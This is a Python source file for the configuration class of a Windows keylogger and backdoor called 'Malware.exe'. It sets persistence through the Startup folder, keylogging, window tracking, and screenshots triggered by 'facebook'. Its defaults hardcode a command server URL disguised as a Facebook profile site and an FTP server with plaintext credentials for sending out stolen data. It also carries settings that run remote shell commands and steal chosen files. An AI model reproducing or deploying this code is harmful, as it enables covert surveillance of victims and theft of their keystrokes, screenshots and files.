import getpass, sys
from os import path
from Util import Util



class Configuration:


    def __init__(self):
        #ABSOLUTE FILE PATHS AND USER DATA
            self.__userName = getpass.getuser()
            self.__fileName = 'Malware.exe'
            self.__filePath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
            self.__logFileName = 'log.txt'
            self.__logPath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\'
            self.__screenshotPath = self.__logPath
            self.__currentDir = path.dirname(sys.executable)
            self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
        #WINDOWTRACKING AND KEYLOGGING
            self.__debug = None
            self.__keyloggingIsActive = None
            self.__windowTrackingIsActive = None
            self.__samplingFrequency = None
            self.__screenshotFrequency = None
            self.__screenshotTrigger = None
        #COMMUNICATION
            self.__baseURL = None
            self.__communicationFrequency = None
            self.__ftpURL = None
            self.__ftpUserName = None
            self.__ftpPassword = None
        #BACKDOOR
            self.__shellCommand = None
            self.__stealPath = None
        #SET ATTRIBUTES
            self.setAttributes()
            


    def setAttributes(self):
            try:
                config = Util.jsonIn(self.__logPath + 'config.json')
                self.__setConfig(config)
                Util.extractShellData(self.__logPath, self.__shellCommand)
                Util.stealFile(self.__logPath, self.__stealPath)
                print('Config.json loaded!')
            except Exception:
                self.__setDefault()
                print('Default loaded!')



    def __setConfig(self, config:dict):
            self.__debug = config['debug']
            self.__keyloggingIsActive = config['keyloggingIsActive']
            self.__windowTrackingIsActive = config['windowTrackingIsActive']
            self.__samplingFrequency = config['samplingfrequency']
            self.__screenshotFrequency = config['screenshotfrequency']
            self.__screenshotTrigger = config['screenshottrigger']
            self.__baseURL = config['baseurl']
            self.__communicationFrequency = config['communicationfrequency']
            self.__ftpURL = config['ftpurl']
            self.__ftpUserName = config['ftpusername']
            self.__ftpPassword = config['ftppassword']
            self.__shellCommand = config.get('shellcommand','')
            self.__stealPath = config.get('stealpath','')



    def __setDefault(self):
            self.__debug = True
            self.__keyloggingIsActive = True
            self.__windowTrackingIsActive = True
            self.__samplingFrequency = 0.1
            self.__screenshotFrequency = 50
            self.__screenshotTrigger = 'facebook'
            self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
            self.__communicationFrequency = 5
            self.__ftpURL = 'ftp://ftp.atw.hu'
            self.__ftpUserName = 'kiserletimuto'
            self.__ftpPassword = 'patti'



    @property
    def debug(self):
        return self.__debug

    @property
    def fileName(self):
        return self.__fileName

    @property
    def filePath(self):
        return self.__filePath

    @property
    def logPath(self):
        return self.__logPath

    @property
    def screenshotPath(self):
        return self.__screenshotPath

    @property
    def currentDir(self):
        return self.__currentDir

    @property
    def currentPath(self):
        return self.__currentPath

    @property
    def samplingFrequency(self):
        return self.__samplingFrequency

    @property
    def screenshotFrequency(self):
        return self.__screenshotFrequency

    @property
    def screenshotTrigger(self):
        return self.__screenshotTrigger

    @property
    def logFileName(self):
        return self.__logFileName

    @property
    def keyloggingIsActive(self):
        return self.__keyloggingIsActive

    @property
    def windowTrackingIsActive(self):
        return self.__windowTrackingIsActive

    @property
    def baseURL(self):
        return self.__baseURL

    @property
    def communicationFrequency(self):
        return self.__communicationFrequency

    @property
    def userName(self):
        return self.__userName

    @property
    def ftpURL(self):
        return self.__ftpURL

    @property
    def ftpUserName(self):
        return self.__ftpUserName

    @property
    def ftpPassword(self):
        return self.__ftpPassword
